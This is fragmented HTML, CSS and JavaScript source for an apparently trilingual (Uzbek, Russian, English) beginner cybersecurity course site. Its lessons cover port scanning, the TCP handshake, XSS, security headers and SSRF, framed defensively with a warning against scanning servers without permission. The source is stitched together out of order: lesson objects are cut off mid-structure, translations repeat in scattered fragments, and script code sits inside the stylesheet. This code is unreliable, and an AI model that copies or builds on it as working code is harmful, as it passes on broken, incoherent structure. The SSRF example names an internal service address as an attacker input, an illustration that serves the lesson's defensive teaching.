<title>Kiber Darslik</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,600;12..96,800&family=Source+Sans+3:ital,wght@0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;600&display=swap">
<style>
:root {
  --bg: #eef1f5;
  --surface: #ffffff;
  --sunk: #e4e8ef;
  --ink: #16202e;
  --muted: #566476;
  --line: #d3d9e2;
  --accent: #2f5bea;
  --accent-soft: #e3e9fd;
  --on-accent: #ffffff;
  --good: #16804f;
  --good-soft: #def3e8;
  --warn: #a8690c;
  --warn-soft: #fbefd9;
  --bad: #c0392f;
  --bad-soft: #fbe3e1;
  --code-bg: #16202e;
  --code-ink: #dbe4f0;
  --code-key: #8fb0ff;
  --code-str: #9fd7a8;
  --code-com: #7f8ea3; --gold: #f5c04a; --gold: #b8860b;
  --display: "Bricolage Grotesque", "Segoe UI", system-ui, sans-serif;
  --body: "Source Sans 3", "Segoe UI", system-ui, sans-serif;
  --mono: "JetBrains Mono", ui-monospace, Consolas, monospace;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    color-scheme: dark;
    --bg: #0d121a; --surface: #151c27; --sunk: #1c2533; --ink: #e2e8f1; --muted: #8e9bae;
    --line: #273244; --accent: #7d9bff; --accent-soft: #1d2a4d; --on-accent: #0d121a;
    --good: #4cc98a; --good-soft: #15302a; --warn: #e3a64a; --warn-soft: #33281a;
    --bad: #f07b72; --bad-soft: #3a1f22; --code-bg: #0a0e14;
  }
}
:root[data-theme="dark"] {
  color-scheme: dark;
  --bg: #0d121a; --surface: #151c27; --sunk: #1c2533; --ink: #e2e8f1; --muted: #8e9bae;
  --line: #273244; --accent: #7d9bff; --accent-soft: #1d2a4d; --on-accent: #0d121a;
  --good: #4cc98a; --good-soft: #15302a; --warn: #e3a64a; --warn-soft: #33281a;
  --bad: #f07b72; --bad-soft: #3a1f22; --code-bg: #0a0e14;
}
* { box-sizing: border-box; }
[hidden] { display: none !important; }
body {
  background: var(--bg); color: var(--ink);
  font: 17px/1.6 var(--body);
  padding-inline: 16px; padding-block: 0 48px;
}
.wrap { max-width: 1120px; margin: 0 auto; }

/* ---------- Header ---------- */
.top { display: flex; flex-wrap: wrap; align-items: end; justify-content: space-between; gap: 16px; padding-block: 28px 20px; }
.brand h1 { font: 800 clamp(28px, 4vw, 40px)/1.05 var(--display); margin: 0; letter-spacing: -0.01em; }
.brand p { margin: 6px 0 0; color: var(--muted); font-size: 15px; }
.prog { min-width: 220px; flex: 0 1 300px; }
.prog-label { display: flex; justify-content: space-between; font-size: 13px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; font-weight: 600; }
.prog-label b { color: var(--ink); font-variant-numeric: tabular-nums; }
.bar { height: 8px; background: var(--sunk); border-radius: 4px; margin-top: 6px; overflow: hidden; }
.bar i { display: block; height: 100%; width: 0; background: var(--good); transition: width .4s; }

/* ---------- Layout ---------- */
.layout { display: grid; grid-template-columns: 260px 1fr; gap: 28px; align-items: start; }
.nav { position: sticky; top: calc(env(safe-area-inset-top, 0px) + 16px); display: grid; gap: 4px; }
.nav button {
  display: grid; grid-template-columns: 30px 1fr; gap: 10px; align-items: center; text-align: left;
  background: none; border: 1px solid transparent; border-radius: 10px; padding: 10px 12px;
  color: var(--ink); font: 600 15px/1.3 var(--body); cursor: pointer;
}
.nav button small { display: block; color: var(--muted); font-weight: 400; font-size: 13px; }
.nav button:hover { background: var(--surface); }
.nav button.on { background: var(--surface); border-color: var(--line); }
.nav .num {
  width: 30px; height: 30px; border-radius: 50%; display: grid; place-items: center;
  font: 600 13px var(--mono); background: var(--sunk); color: var(--muted);
}
.nav button.on .num { background: var(--accent); color: var(--on-accent); }
.nav button.done .num { background: var(--good); color: var(--on-accent); }

/* ---------- Lesson ---------- */
.lesson { background: var(--surface); border: 1px solid var(--line); border-radius: 16px; padding: clamp(20px, 4vw, 40px); min-width: 0; }
.eyebrow { font: 600 13px var(--body); text-transform: uppercase; letter-spacing: .08em; color: var(--accent); }
.lesson h2 { font: 800 clamp(26px, 3.4vw, 34px)/1.15 var(--display); margin: 6px 0 10px; text-wrap: balance; }
.lead { font-size: 19px; color: var(--muted); margin: 0 0 8px; max-width: 62ch; }
.meta { display: flex; flex-wrap: wrap; gap: 8px; margin: 14px 0 0; }
.chip { font-size: 13px; padding: 3px 10px; border-radius: 999px; background: var(--sunk); color: var(--muted); }

.sec { margin-top: 36px; }
.sec > h3 {
  font: 600 13px var(--body); text-transform: uppercase; letter-spacing: .08em; color: var(--muted);
  display: flex; align-items: center; gap: 10px; margin: 0 0 12px;
}
.sec > h3::after { content: ""; flex: 1; height: 1px; background: var(--line); }
.prose { max-width: 66ch; }
.prose p { margin: 0 0 12px; }
.prose ul, .prose ol { margin: 0 0 12px; padding-left: 22px; }
.prose li { margin: 4px 0; }
.prose h4 { font: 700 18px var(--body); margin: 20px 0 6px; }
code { font: 0.88em var(--mono); background: var(--sunk); padding: 1px 5px; border-radius: 4px; }
.analogy { background: var(--accent-soft); border-radius: 12px; padding: 14px 18px; margin: 4px 0 14px; max-width: 66ch; }
.analogy b { color: var(--accent); }
.note { border-left: 3px solid var(--warn); background: var(--warn-soft); padding: 10px 16px; border-radius: 0 10px 10px 0; margin: 12px 0; max-width: 66ch; font-size: 16px; }
.tbl { overflow-x: auto; margin: 8px 0 14px; }
table { border-collapse: collapse; width: 100%; font-size: 15px; }
th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
td code { white-space: nowrap; }
th { color: var(--muted); font-weight: 600; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; }

/* Code block */
pre.code {
  background: var(--code-bg); color: var(--code-ink); border-radius: 12px; padding: 16px 18px;
  font: 14px/1.6 var(--mono); overflow-x: auto; margin: 0 0 12px;
}
pre.code .k { color: var(--code-key); } pre.code .s { color: var(--code-str); } pre.code .c { color: var(--code-com); font-style: italic; }
.file { font: 12px var(--mono); color: var(--muted); margin-bottom: 6px; }
.explain { display: grid; gap: 8px; max-width: 66ch; margin: 0; padding: 0; list-style: none; counter-reset: ex; }
.explain li { display: grid; grid-template-columns: 26px 1fr; gap: 10px; counter-increment: ex; }
.explain li::before { content: counter(ex); font: 600 12px var(--mono); width: 22px; height: 22px; border-radius: 6px; display: grid; place-items: center; background: var(--sunk); color: var(--muted); margin-top: 3px; }

/* Lab */
.lab { background: var(--sunk); border-radius: 14px; padding: 20px; display: grid; gap: 14px; }
.lab label { font-weight: 600; font-size: 15px; display: block; margin-bottom: 4px; }
.row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
input[type=text], textarea, select {
  width: 100%; background: var(--surface); color: var(--ink); border: 1px solid var(--line);
  border-radius: 10px; padding: 10px 12px; font: 15px var(--mono);
}
input[type=range] { width: 100%; accent-color: var(--accent); }
input:focus-visible, textarea:focus-visible, select:focus-visible, button:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
.btn {
  background: var(--accent); color: var(--on-accent); border: 0; border-radius: 10px; padding: 10px 18px;
  font: 700 15px var(--body); cursor: pointer;
}
.btn.ghost { background: var(--surface); color: var(--ink); border: 1px solid var(--line); }
.btn:disabled { opacity: .45; cursor: default; }
.checks { display: flex; flex-wrap: wrap; gap: 8px 16px; font-size: 15px; }
.checks label { font-weight: 400; display: flex; gap: 6px; align-items: center; margin: 0; }
.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; }
.stat { background: var(--surface); border-radius: 10px; padding: 10px 14px; }
.stat span { display: block; font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; font-weight: 600; }
.stat b { font: 600 20px var(--mono); font-variant-numeric: tabular-nums; }
.mono { font-family: var(--mono); font-size: 14px; word-break: break-all; }
.hashbox { background: var(--surface); border-radius: 10px; padding: 10px 12px; font: 14px/1.7 var(--mono); word-break: break-all; }
.hashbox .d { background: var(--bad-soft); color: var(--bad); border-radius: 2px; }
.fb { font-size: 15px; padding: 10px 14px; border-radius: 10px; }
.fb.ok { background: var(--good-soft); color: var(--good); }
.fb.no { background: var(--bad-soft); color: var(--bad); }
.pane-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.pane { background: var(--surface); border-radius: 10px; padding: 12px; min-height: 90px; overflow-wrap: anywhere; }
.pane h5 { margin: 0 0 6px; font: 600 12px var(--body); text-transform: uppercase; letter-spacing: .06em; }
.pane.bad h5 { color: var(--bad); } .pane.good h5 { color: var(--good); }
.urlparts { font: 15px/2 var(--mono); background: var(--surface); padding: 10px 12px; border-radius: 10px; word-break: break-all; }
.urlparts span { padding: 2px 3px; border-radius: 4px; }
.p-scheme { background: var(--sunk); } .p-sub { background: var(--warn-soft); color: var(--warn); }
.p-dom { background: var(--good-soft); color: var(--good); font-weight: 600; outline: 2px solid var(--good); }
.p-path { color: var(--muted); }
.legend { display: flex; flex-wrap: wrap; gap: 12px; font-size: 13px; color: var(--muted); }
.legend i { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: 4px; vertical-align: middle; }
.game { display: grid; gap: 8px; }
.gitem { background: var(--surface); border-radius: 10px; padding: 10px 12px; display: grid; gap: 8px; }
.gitem .mono { font-size: 14px; }
.gitem .row .btn { padding: 6px 12px; font-size: 14px; }
.gitem .why { font-size: 14px; }

/* Handshake diagram */
.hs { background: var(--surface); border-radius: 12px; padding: 12px; overflow-x: auto; }
.hs svg { display: block; width: 100%; min-width: 440px; height: auto; }
.hs text { font-family: var(--body); fill: var(--ink); }
.hs .lbl { font-size: 13px; fill: var(--muted); }

/* Homework */
.hw { border: 1px dashed var(--accent); border-radius: 14px; padding: 18px 20px; }
.hw h4 { margin: 0 0 6px; font: 700 17px var(--body); }
details { margin-top: 10px; }
summary { cursor: pointer; color: var(--accent); font-weight: 600; }

/* Quiz */
.quiz { display: grid; gap: 18px; }
.q p { margin: 0 0 8px; font-weight: 600; }
.opts { display: grid; gap: 6px; }
.opt {
  text-align: left; background: var(--surface); border: 1px solid var(--line); border-radius: 10px;
  padding: 10px 14px; font: 16px var(--body); color: var(--ink); cursor: pointer;
}
.opt:hover:not(:disabled) { border-color: var(--accent); }
.opt.right { border-color: var(--good); background: var(--good-soft); color: var(--good); font-weight: 600; }
.opt.wrong { border-color: var(--bad); background: var(--bad-soft); color: var(--bad); }
.opt:disabled { cursor: default; }
.q .fb { margin-top: 8px; }
.result { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 12px; padding: 16px 18px; border-radius: 12px; background: var(--sunk); }
.result.pass { background: var(--good-soft); color: var(--good); font-weight: 600; }

.pager { display: flex; justify-content: space-between; gap: 12px; margin-top: 36px; padding-top: 20px; border-top: 1px solid var(--line); }


/* ---------- Til va Toolkit tugmalari ---------- */
.toolrow { display: flex; align-items: center; gap: 8px; }
.lang { display: inline-flex; border: 1px solid var(--line); border-radius: 8px; overflow: hidden; background: var(--surface); }
.lang button { background: none; border: 0; color: var(--muted); padding: 6px 9px; font: 700 12px var(--body); letter-spacing: .05em; cursor: pointer; }
.lang button + button { border-left: 1px solid var(--line); }
.lang button[aria-pressed="true"] { background: var(--accent); color: var(--on-accent); }
.navlink {
  display: inline-flex; align-items: center; gap: 6px; padding: 8px 14px; border-radius: 10px;
  border: 1px solid var(--line); background: var(--surface); color: var(--ink); text-decoration: none; font: 700 14px var(--body);
}
.navlink:hover { border-color: var(--accent); color: var(--accent); }
.navlink:focus-visible, .lang button:focus-visible, .vaultbtn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
.labnote { margin: 0; font-size: 15px; color: var(--muted); }

/* Chap menyu: oy sarlavhalari */
.navmonth { font: 700 12px var(--body); text-transform: uppercase; letter-spacing: .06em; color: var(--muted); padding: 14px 12px 6px; }
.navmonth.soon { display: flex; justify-content: space-between; align-items: center; gap: 8px; opacity: .6; font-weight: 600; text-transform: none; letter-spacing: 0; }
.navmonth.soon .chip { font-size: 11px; }

/* Dars ichida reja (TOC) */
.toc { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; background: var(--sunk); border-radius: 12px; padding: 10px 12px; margin: 14px 0 4px; }
.toc > span { font: 600 12px var(--body); text-transform: uppercase; letter-spacing: .06em; color: var(--muted); margin-right: 4px; }
.tocbtn { background: var(--surface); border: 1px solid var(--line); color: var(--ink); border-radius: 999px; padding: 4px 12px; font: 500 13px var(--body); cursor: pointer; }
.tocbtn:hover { border-color: var(--accent); color: var(--accent); }

/* Cheat-sheet jadvali */
.cheat table td:first-child { white-space: nowrap; }
.cheat code { background: var(--sunk); }

/* Manbalar ro'yxati */
ul.links { list-style: none; margin: 0; padding: 0; display: grid; gap: 10px; }
ul.links li { display: grid; gap: 2px; padding: 12px 14px; background: var(--sunk); border-radius: 12px; }
ul.links a { color: var(--accent); font-weight: 700; text-decoration: none; }
ul.links a:hover { text-decoration: underline; }
ul.links li span { color: var(--muted); font-size: 14px; }

/* Terminal labi */
.term-wrap { background: #0a0e14; border: 1px solid var(--line); border-radius: 12px; overflow: hidden; cursor: text; }
.term { padding: 12px 14px; font: 13px/1.55 var(--mono); color: #cfe3d6; min-height: 220px; max-height: 320px; overflow-y: auto; white-space: pre-wrap; word-break: break-word; }
.term .cmdline { color: #7fd58f; } .term .err { color: #f2837b; }
.term-in { display: flex; align-items: center; gap: 8px; border-top: 1px solid #1c2733; padding: 8px 14px; background: #0a0e14; }
.term-in .prompt { color: #7fd58f; font: 13px var(--mono); white-space: nowrap; }
.term-in input { flex: 1; background: none; border: 0; color: #cfe3d6; font: 13px var(--mono); outline: none; padding: 0; }
.tasks { margin-top: 12px; background: var(--sunk); border-radius: 12px; padding: 12px 16px; font-size: 15px; }
.tasks ol { margin: 8px 0; padding-left: 20px; display: grid; gap: 4px; }
.tasks li.ok { color: var(--good); }

/* Subnet labi */
.binrow { display: flex; gap: 10px; align-items: baseline; margin-top: 6px; font-size: 13px; flex-wrap: wrap; }
.binrow > span { color: var(--muted); min-width: 110px; }
.binrow code { font-family: var(--mono); background: var(--sunk); padding: 2px 6px; border-radius: 4px; letter-spacing: .5px; }
.binrow code .on1 { color: var(--accent); font-weight: 700; }

/* Python quiz labi */
.pyq { background: var(--sunk); border-radius: 12px; padding: 16px; display: grid; gap: 10px; }
.pyq pre.code { margin: 0; }
.pyq .opt code { background: transparent; color: inherit; }

/* Git labi */
.git-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 10px; }
.git-col { background: var(--sunk); border-radius: 10px; padding: 10px; min-height: 120px; }
.git-col h5 { margin: 0 0 8px; font: 600 12px var(--body); text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
.git-col ul { list-style: none; margin: 0; padding: 0; display: grid; gap: 5px; font: 13px var(--mono); }
.git-col .mod { color: var(--warn); } .git-col .stg { color: var(--good); } .git-col .cmt { color: var(--accent); }
.git-col .cmt small { color: var(--muted); display: block; font-size: 11px; }
.git-col .empty { color: var(--muted); opacity: .6; }
.git-cmd { background: #0a0e14; border: 1px solid var(--line); border-radius: 10px; margin-top: 0; }
.git-cmd .prompt { color: #7fd58f; }
.git-cmd input { color: #cfe3d6; }
.git-out { margin-top: 10px; font: 13px/1.6 var(--mono); background: var(--sunk); border-radius: 10px; padding: 10px 14px; min-height: 40px; }
.git-out .ok { color: var(--good); } .git-out .err { color: var(--bad); } .git-out .mod { color: var(--warn); }
@media (max-width: 560px) { .git-grid { grid-template-columns: 1fr; } .git-col { min-height: 0; } }


/* ---------- Seyf ---------- */
.topright { display: flex; flex-wrap: wrap; align-items: end; gap: 20px; }
.vaultbtn {
  display: inline-flex; align-items: center; gap: 8px; padding: 10px 16px; border-radius: 10px;
  background: var(--ink); color: var(--bg); border: 0; font: 700 15px var(--body); cursor: pointer;
}
.vaultbtn[aria-pressed="true"] { background: var(--surface); color: var(--ink); border: 1px solid var(--line); }
.vault { max-width: 820px; margin: 0 auto; display: grid; gap: 16px; }
.vcard { background: var(--surface); border: 1px solid var(--line); border-radius: 16px; padding: clamp(18px, 4vw, 32px); display: grid; gap: 14px; }
.vcard h3 { font: 800 24px/1.2 var(--display); margin: 0; }
.vcard.editor { border-color: var(--accent); }
.lockicon { color: var(--accent); }
.muted { color: var(--muted); margin: 0; font-size: 15px; }
.field { display: grid; gap: 4px; }
.field label { font-weight: 600; font-size: 15px; }
.row.nowrap { flex-wrap: nowrap; }
.row.nowrap > input { flex: 1; min-width: 0; }
input[type=password], input[type=search], input[type=file] {
  width: 100%; background: var(--surface); color: var(--ink); border: 1px solid var(--line);
  border-radius: 10px; padding: 10px 12px; font: 15px var(--mono);
}
input[type=file] { font-family: var(--body); }
.vcard input[type=text], .vcard input[type=password], .vcard textarea, .vcard select { background: var(--bg); }
.mono-in { font-family: var(--mono) !important; }
.btn.sm { padding: 6px 12px; font-size: 14px; white-space: nowrap; }
.btn.danger { color: var(--bad); }
.btn.danger-solid { background: var(--bad); color: var(--on-accent); }
.linkbtn { background: none; border: 0; color: inherit; font: inherit; text-decoration: underline; cursor: pointer; padding: 0; font-weight: 700; }
.err-line { color: var(--bad); font-size: 15px; min-height: 1px; }
.err-line:empty { display: none; }
.vnote { padding: 10px 14px; border-radius: 10px; font-size: 15px; }
.vnote.bad { background: var(--bad-soft); color: var(--bad); }
.vnote.warn { background: var(--warn-soft); color: var(--warn); }
.meter-wrap { display: grid; gap: 4px; }
.meter-wrap small { color: var(--muted); font-variant-numeric: tabular-nums; }
.vmeter { height: 6px; background: var(--sunk); border-radius: 3px; overflow: hidden; }
.vmeter i { display: block; height: 100%; transition: width .2s; }
.vmeter i.bad { background: var(--bad); } .vmeter i.warn { background: var(--warn); } .vmeter i.good { background: var(--good); }
.vtop { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 12px; }
.vtitle { display: flex; align-items: baseline; gap: 12px; flex-wrap: wrap; }
.vtitle h3 { font: 800 28px/1.1 var(--display); margin: 0; }
.clock { font: 13px var(--mono); color: var(--muted); font-variant-numeric: tabular-nums; }
.vbar { display: grid; gap: 10px; }
.vchips { display: flex; flex-wrap: wrap; gap: 6px; }
.vchip { background: var(--surface); border: 1px solid var(--line); color: var(--ink); border-radius: 999px; padding: 5px 14px; font: 600 14px var(--body); cursor: pointer; font-variant-numeric: tabular-nums; }
.vchip.on { background: var(--accent); border-color: var(--accent); color: var(--on-accent); }
.vlist { display: grid; gap: 10px; }
.ventry { background: var(--surface); border: 1px solid var(--line); border-radius: 14px; padding: 14px 18px; display: grid; gap: 10px; min-width: 0; }
.vhead { display: grid; grid-template-columns: auto 1fr auto; gap: 10px; align-items: center; }
.vhead h4 { margin: 0; font: 700 17px var(--body); overflow-wrap: anywhere; }
.vtype { font: 600 11px var(--body); text-transform: uppercase; letter-spacing: .07em; padding: 3px 8px; border-radius: 6px; background: var(--sunk); color: var(--muted); white-space: nowrap; }
.vtype.t-parol { background: var(--accent-soft); color: var(--accent); }
.vtype.t-kod { background: var(--good-soft); color: var(--good); }
.vtype.t-eslatma { background: var(--warn-soft); color: var(--warn); }

let LANG = (() => { try { const s = localStorage.getItem("kd-lang"); if (s && UI[s]) return s; } catch {} return "uz"; })();
const LOCALE = { uz: "uz-UZ", ru: "ru-RU", en: "en-GB" };
function t(key, params = {}) {
  const v = UI[LANG][key] ?? UI.uz[key] ?? key;
  return typeof v === "string" ? v.replace(/\{(\w+)\}/g, (_, k) => params[k] ?? "") : v;
}
const langListeners = [];
function setLang(l) {
  if (!UI[l] || l === LANG) return;
  LANG = l;
  try { localStorage.setItem("kd-lang", l); } catch {}
  langListeners.forEach((fn) => fn());
}

          <li><code>ACK</code> — mijoz: "Yaxshi, boshladik".</li>
        </ol>
        <p>Sizning scanner'ingiz aynan shu ulanishni to'liq amalga oshiradi. Buni <b>TCP connect scan</b> deyishadi. Nmap'ning <code>-sS</code> (SYN scan) rejimi esa uchinchi qadamni qilmaydi. U tezroq ishlaydi va loglarda kamroq iz qoldiradi.</p>

  lead: "Brauzer va server qanday gaplashadi, XSS hujumi nima va xavfsizlik sarlavhalari saytni qanday himoyalaydi.",
  sections: [
    { h: "Nima bu?", html: `
      <div class="prose">
        <p>Brauzer saytni ochganda serverga <b>HTTP so'rov</b> yuboradi, server esa <b>javob</b> qaytaradi. Javobning ikki qismi bor: sahifaning o'zi (body) va ko'rinmas sozlamalar — <b>sarlavhalar (headers)</b>. Sarlavhalar brauzerga "shu sahifa bilan qanday ehtiyot bo'l" deb ko'rsatma beradi.</p>
        <pre class="code">HTTP/1.1 200 OK
<span class="k">Content-Type</span>: text/html
<span class="k">Strict-Transport-Security</span>: max-age=31536000
<span class="k">Content-Security-Policy</span>: default-src 'self'
<span class="k">X-Frame-Options</span>: DENY</pre>
        <h4>XSS (Cross-Site Scripting)</h4>
        <p>XSS — OWASP Top 10'dagi eng keng tarqalgan zaifliklardan biri. Xaker saytga izoh sifatida matn emas, <b>kod</b> yozadi. Sayt uni tozalamasdan sahifaga qo'ysa, bu kod har bir tashrif buyuruvchining brauzerida ishga tushadi. U cookie'larni o'g'irlashi, sahifani o'zgartirishi yoki foydalanuvchi nomidan harakat qilishi mumkin.</p>
      </div>` },
    { h: "Sinab ko'ring", lab: "xss" },
    { h: "Himoya sarlavhalari", html: `
      <div class="tbl"><table>
        <tr><th>Sarlavha</th><th>Nimadan himoya qiladi</th></tr>
        <tr><td><code>Content-Security-Policy</code></td><td>XSS. Faqat ruxsat berilgan manbadan skript yuklanadi, begona kod ishlamaydi.</td></tr>
        <tr><td><code>Strict-Transport-Security</code></td><td>HTTPS'dan HTTP'ga tushirish hujumi. Brauzer saytga faqat shifrlangan ulanish orqali kiradi.</td></tr>
        <tr><td><code>X-Frame-Options</code></td><td>Clickjacking. Saytingiz boshqa sayt ichiga ko'rinmas qilib joylashtirilmaydi.</td></tr>
        <tr><td><code>X-Content-Type-Options</code></td><td>Brauzer faylni boshqa turdagi fayl deb "taxmin qilib" ishga tushirmaydi.</td></tr>
      </table></div>
      <div class="prose">
        <h4>SSRF — bonus tushuncha</h4>
        <p>HTTP headers vositangiz siz bergan URL'ga server nomidan so'rov yuboradi. Agar xaker <code>http://127.0.0.1:6379</code> yozsa, server o'zining ichki xizmatlariga murojaat qilib qo'yadi. Bu <b>SSRF</b> hujumi. Shuning uchun <code>headers.py</code> ichki manzillarni bloklaydi va har bir redirect'ni qayta tekshiradi.</p>
      </div>` },
    { h: "Loyihangizdagi kod", code: {
      file: "cyber-toolkit/static/app.js + app.py",
      src: `<span class="c">// app.js — serverdan kelgan har bir matn shu funksiyadan o'tadi</span>
<span class="k">const</span> esc = (s) =&gt; String(s).replace(<span class="s">/[&amp;&lt;&gt;"']/g</span>, (c) =&gt;
  ({ <span class="s">"&amp;"</span>: <span class="s">"&amp;amp;"</span>, <span class="s">"&lt;"</span>: <span class="s">"&amp;lt;"</span>, <span class="s">"&gt;"</span>: <span class="s">"&amp;gt;"</span>, <span class="s">'"'</span>: <span class="s">"&amp;quot;"</span>, <span class="s">"'"</span>: <span class="s">"&amp;#39;"</span> }[c]));

<span class="c"># app.py — har bir javobga sarlavha qo'shiladi</span>
@app.after_request
<span class="k">def</span> security_headers(resp):
    resp.headers[<span class="s">"Content-Security-Policy"</span>] = <span class="s">"default-src 'self'"</span>
    resp.headers[<span class="s">"X-Frame-Options"</span>] = <span class="s">"DENY"</span>

  sections: [
    { h: "Что это?", html: `
      <div class="analogy"><b>Аналогия:</b> IP-адрес — это адрес многоквартирного дома. Порт — номер квартиры. В доме 65 535 квартир, в каждой живёт свой сервис: в 22-й SSH, в 80-й веб-сайт, в 3306-й база MySQL.</div>
      <div class="prose">
        <p>Порт бывает в трёх состояниях:</p>
        <ul>
          <li><b>Открыт (open)</b> — сервис работает и принимает соединения.</li>
          <li><b>Закрыт (closed)</b> — компьютер есть, но на порту никого. Он сразу отвечает «нет» (RST).</li>
          <li><b>Фильтруется (filtered)</b> — firewall молча отбрасывает запрос. Ответа нет, истекает таймаут.</li>
        </ul>
        <p>Первый шаг пентеста — разведка: какие порты открыты, какая программа и какой версии на них работает. Каждый открытый порт — потенциальный вход для атаки.</p>
      </div>
      <div class="note">Сканирование чужого сервера без разрешения владельца может быть незаконным. Тренируйтесь на своём компьютере, <code>scanme.nmap.org</code> и в лабораториях TryHackMe или HackTheBox.</div>` },
    { h: "TCP-рукопожатие", html: `
      <div class="prose">
        <p>TCP-соединение начинается с трёх сообщений. Это называется <b>3-way handshake</b>:</p>
        <ol>
          <li><code>SYN</code> — клиент: «Привет, хочу подключиться».</li>
          <li><code>SYN-ACK</code> — сервер: «Привет, готов».</li>
          <li><code>ACK</code> — клиент: «Отлично, начинаем».</li>
        </ol>
        <p>Ваш сканер проводит это соединение полностью. Это называется <b>TCP connect scan</b>. Режим Nmap <code>-sS</code> (SYN scan) пропускает третий шаг. Он быстрее и оставляет меньше следов в логах.</p>
      </div>` },

{

  id: "web", title: "Веб-защита и XSS", sub: "HTTP-заголовки", time: "45 мин",
  tags: ["Blue team", "Веб-безопасность"],
  lead: "Как общаются браузер и сервер, что такое XSS-атака и как заголовки безопасности защищают сайт.",
  sections: [
    { h: "Что это?", html: `
      <div class="prose">
        <p>Открывая сайт, браузер отправляет серверу <b>HTTP-запрос</b>, а сервер возвращает <b>ответ</b>. У ответа две части: сама страница (body) и невидимые настройки — <b>заголовки (headers)</b>. Заголовки говорят браузеру, насколько осторожно обращаться со страницей.</p>
        <pre class="code">HTTP/1.1 200 OK
<span class="k">Content-Type</span>: text/html
<span class="k">Strict-Transport-Security</span>: max-age=31536000
<span class="k">Content-Security-Policy</span>: default-src 'self'
<span class="k">X-Frame-Options</span>: DENY</pre>
        <h4>XSS (Cross-Site Scripting)</h4>
        <p>XSS — одна из самых распространённых уязвимостей из OWASP Top 10. Злоумышленник пишет на сайт, например в комментарий, не текст, а <b>код</b>. Если сайт вставит его на страницу без очистки, код выполнится в браузере каждого посетителя. Он может украсть cookie, изменить страницу или действовать от имени пользователя.</p>
      </div>` },
    { h: "Попробуйте", lab: "xss" },
    { h: "Защитные заголовки", html: `
      <div class="tbl"><table>
        <tr><th>Заголовок</th><th>От чего защищает</th></tr>
        <tr><td><code>Content-Security-Policy</code></td><td>XSS. Скрипты загружаются только из разрешённых источников, чужой код не выполняется.</td></tr>
        <tr><td><code>Strict-Transport-Security</code></td><td>Атаки с понижением HTTPS до HTTP. Браузер заходит на сайт только по зашифрованному соединению.</td></tr>
        <tr><td><code>X-Frame-Options</code></td><td>Clickjacking. Ваш сайт нельзя невидимо встроить в другой сайт.</td></tr>
        <tr><td><code>X-Content-Type-Options</code></td><td>Браузер не будет «угадывать» другой тип файла и запускать его.</td></tr>
      </table></div>
      <div class="prose">
        <h4>SSRF — бонусное понятие</h4>
        <p>Ваш инструмент HTTP headers отправляет запрос от имени сервера по URL, который вы ввели. Если злоумышленник введёт <code>http://127.0.0.1:6379</code>, сервер обратится к собственным внутренним сервисам. Это атака <b>SSRF</b>. Поэтому <code>headers.py</code> блокирует внутренние адреса и заново проверяет каждый редирект.</p>

  sections: [

        <p>The first step of a pentest is reconnaissance: which ports are open, and which software and version runs on each. Every open port is a potential way in.</p>

        <p>Your scanner completes this whole connection. That's called a <b>TCP connect scan</b>. Nmap's <code>-sS</code> (SYN scan) mode skips the third step. It's faster and leaves fewer traces in logs.</p>

  lead: "How a browser and a server talk, what an XSS attack is, and how security headers protect a site.",
  sections: [
    { h: "What is it?", html: `
      <div class="prose">
        <p>When a browser opens a site, it sends the server an <b>HTTP request</b> and the server sends back a <b>response</b>. The response has two parts: the page itself (the body) and invisible settings called <b>headers</b>. Headers tell the browser how carefully to treat the page.</p>
        <pre class="code">HTTP/1.1 200 OK
<span class="k">Content-Type</span>: text/html
<span class="k">Strict-Transport-Security</span>: max-age=31536000
<span class="k">Content-Security-Policy</span>: default-src 'self'
<span class="k">X-Frame-Options</span>: DENY</pre>
        <h4>XSS (Cross-Site Scripting)</h4>
        <p>XSS is one of the most common vulnerabilities in the OWASP Top 10. An attacker posts <b>code</b> instead of text, say as a comment. If the site puts it on the page without cleaning it, the code runs in every visitor's browser. It can steal cookies, change the page, or act on the user's behalf.</p>
      </div>` },
    { h: "Try it", lab: "xss" },
    { h: "Protective headers", html: `
      <div class="tbl"><table>
        <tr><th>Header</th><th>Protects against</th></tr>
        <tr><td><code>Content-Security-Policy</code></td><td>XSS. Scripts load only from allowed sources, so injected code doesn't run.</td></tr>
        <tr><td><code>Strict-Transport-Security</code></td><td>HTTPS-to-HTTP downgrade attacks. The browser only connects over an encrypted connection.</td></tr>
        <tr><td><code>X-Frame-Options</code></td><td>Clickjacking. Your site can't be invisibly embedded inside another site.</td></tr>
        <tr><td><code>X-Content-Type-Options</code></td><td>The browser won't "guess" a file is a different type and run it.</td></tr>
      </table></div>
      <div class="prose">
        <h4>SSRF: a bonus concept</h4>
        <p>Your HTTP headers tool sends a request on the server's behalf to the URL you give it. If an attacker enters <code>http://127.0.0.1:6379</code>, the server ends up calling its own internal services. That's an <b>SSRF</b> attack. So <code>headers.py</code> blocks internal addresses and re-checks every redirect.</p>
      </div>` },

          <p>Адреса делятся на два типа:</p>

          <pre class="code"><span class="k">GET</span> /login HTTP/1.1
<span class="k">Host</span>: example.com
<span class="k">User-Agent</span>: Mozilla/5.0

<span class="c">← ответ:</span>
HTTP/1.1 <span class="s">200 OK</span>
<span class="k">Content-Type</span>: text/html</pre>
